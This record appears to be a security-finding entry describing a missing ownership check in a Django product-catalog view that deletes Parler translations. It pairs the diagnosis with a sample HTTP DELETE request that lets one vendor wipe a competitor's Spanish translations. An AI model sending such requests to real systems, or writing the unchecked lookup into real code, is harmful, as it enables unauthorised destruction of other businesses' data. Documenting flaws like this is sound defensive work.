diagnosis: ProductTranslationDeleteView allows deleting specific language translations for product catalog entries using Parler's delete_translation(). The view looks up LocalizedProductCatalog.objects.get(pk=catalog_id) without checking whether request.user is the vendor or owner of that catalog entry. An authenticated vendor can delete product translations of competitor stores, wiping out their localized marketing and indexing data.
exploit_request:
DELETE /api/catalog/6120/translations/es/ HTTP/1.1
Host: marketplace.global-b2b.io
Authorization: Bearer vendor_auth_token_90
Accept: application/json
